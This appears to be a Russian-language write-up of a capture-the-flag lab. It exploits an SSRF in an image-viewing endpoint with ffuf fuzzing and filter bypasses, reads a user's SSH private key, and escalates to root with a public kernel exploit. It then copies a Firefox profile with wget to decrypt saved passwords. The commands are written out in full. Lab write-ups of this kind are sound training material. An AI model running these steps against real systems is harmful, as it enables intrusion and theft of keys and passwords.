Изучив сайт страница upload и feedback не имеет уязвимости. На странице gallery находим надпись " <!--To devs: Make sure that people can also add images using links-->"
 Исследуем dejaview(view_image) с возможностью отправки URL
![](../attachment/Pasted%20image%2020250408230722.png)
Исследуем какие параметры работают для SSRF
![](../attachment/Pasted%20image%2020250408214221.png)

Есть возможность прочитать свою директорию, но при чтение локальной директории получаем ошибку (отличающуюся от других ошибок)
![](../attachment/Pasted%20image%2020250408212819.png)![](../attachment/Pasted%20image%2020250408213130.png)
Попробуй обойти фильтр используя словарь [SSRF Cheat Sheet & Bypass Techniques](https://highon.coffee/blog/ssrf-cheat-sheet/)
```
ffuf -w ssrf -X POST -H "Content-Type: application/x-www-form-urlencoded" -u "http://10.10.147.13:8080/view_image" -d "www=http://FUZZ" -fw 27
```
![](../attachment/Pasted%20image%2020250408214141.png)

![](../attachment/Pasted%20image%2020250408213243.png)



Перечислим директории которые есть на 80 порту

```
ffuf -w ~/Downloads/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -X POST -H "Content-Type: application/x-www-form-urlencoded" -u "http://10.10.147.13:8080/view_image" -d "www=http://127.1:80/FUZZ" -fw 96
```
![](../attachment/Pasted%20image%2020250408214905.png)
![](../attachment/Pasted%20image%2020250408214844.png)
Изучив директории и файлы ничего интересного нет.
```
curl -X POST -H "Content-Type: application/x-www-form-urlencoded" http://10.10.147.13:8080/view_image -d "www=http://127.1:80/static/3.jpg" --output 3.jpg
```

Попробуем другой словарь и увидим что мы в домашней директории
```
ffuf -w ~/Downloads/YAWR-master/Web/files_and_directories/the_biggest.txt -X POST -H "Content-Type: application/x-www-form-urlencoded" -u "http://10.10.147.13:8080/view_image" -d "www=http://127.1:80/FUZZ" -fw 96
```
![](../attachment/Pasted%20image%2020250408215932.png)
в authorized_keys мы находим пользователя, в id_rsa приватный ключ 
![](../attachment/Pasted%20image%2020250408231801.png)
Копируем приватный ключ, выдаем права 600 и подключаемся к машине. Забираем первый флаг
![](../attachment/Pasted%20image%2020250408232714.png)
Запустив linpeas видим возможность реализации subuid
![](../attachment/Pasted%20image%2020250408232134.png)
![](../attachment/Pasted%20image%2020250408223527.png)
Эксплоит не сработал хоть и есть root
Поищем эксплоит для ядра 4.15.0-112-generic ([GitHub - zerozenxlabs/ZDI-24-020](https://github.com/zerozenxlabs/ZDI-24-020))
Переместив его на машину, компилируем, запускаем и получаем флаг рут 
![](../attachment/Pasted%20image%2020250408223938.png)
брутфорс Пароля пользователя charles в виде sha512crypt был бы долгим поэтому обратив внимание на директорию .mozila в домашнем каталоге пользователя
Переместим себе папку с данными пользователя firefox и воспользуемся скриптом [GitHub - unode/firefox_decrypt: Firefox Decrypt is a tool to extract passwords from Mozilla (Firefox™, Waterfox™, Thunderbird®, SeaMonkey®) profiles](https://github.com/unode/firefox_decrypt?ysclid=m98ygn5wq322146495) для вывода паролей в чистом виде

```
 wget -r http://10.10.147.13:5566/8k3bf3zp.charles
``` 
![](../attachment/Pasted%20image%2020250408225951.png)
